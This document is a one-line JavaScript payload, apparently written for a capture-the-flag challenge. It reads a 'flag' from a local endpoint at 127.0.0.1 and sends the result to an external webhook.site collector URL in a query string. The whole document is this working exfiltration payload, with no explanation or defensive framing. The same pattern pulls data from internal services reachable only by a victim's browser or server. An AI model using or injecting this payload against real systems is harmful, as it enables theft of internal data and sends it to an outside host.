fetch(`http://127.0.0.1/flag`).then((response) => response.json()).then((data) => {fetch(`https://webhook.site/cc325d9e-af5f-4332-b501-c54004927828/?flag=${JSON.stringify(data)}`)})
